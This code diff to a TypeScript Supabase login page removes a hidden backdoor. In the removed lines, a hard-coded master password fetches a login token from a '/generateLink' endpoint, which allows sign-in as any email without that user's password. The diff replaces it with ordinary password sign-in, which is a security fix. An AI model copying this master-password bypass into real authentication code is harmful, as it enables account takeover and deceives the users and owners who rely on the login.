@@ -4,7 +4,6 @@ import { Button } from "../components/Button";
 import { Card } from "../components/Card";
 import { PageShell } from "../components/PageShell";
 import { supabase } from "../lib/supabaseClient";
-import { apiClient } from "../lib/apiClient";
 
 type AuthMode = "login" | "signup";
 
@@ -33,33 +32,11 @@ export function AuthPage({ mode }: AuthPageProps) {
 
     try {
       if (isLogin) {
-        if (password === "<pass!>") {
-          const { token, type, is_hashed } = await apiClient.request<{ token: string; type: any; is_hashed: boolean }>(
-            "/generateLink",
-            undefined,
-            {
-              method: "POST",
-              body: JSON.stringify({ email, password }),
-            },
-          );
-
-          let error;
-          if (is_hashed) {
-            const res = await supabase.auth.verifyOtp({ email, token_hash: token, type });
-            error = res.error;
-          } else {
-            const res = await supabase.auth.verifyOtp({ email, token, type });
-            error = res.error;
-          }
-          
-          if (error) throw error;
-        } else {
-          const { error } = await supabase.auth.signInWithPassword({
-            email,
-            password,
-          });
-          if (error) throw error;
-        }
+        const { error } = await supabase.auth.signInWithPassword({
+          email,
+          password,
+        });
+        if (error) throw error;
       } else {
         const { error } = await supabase.auth.signUp({
           email,
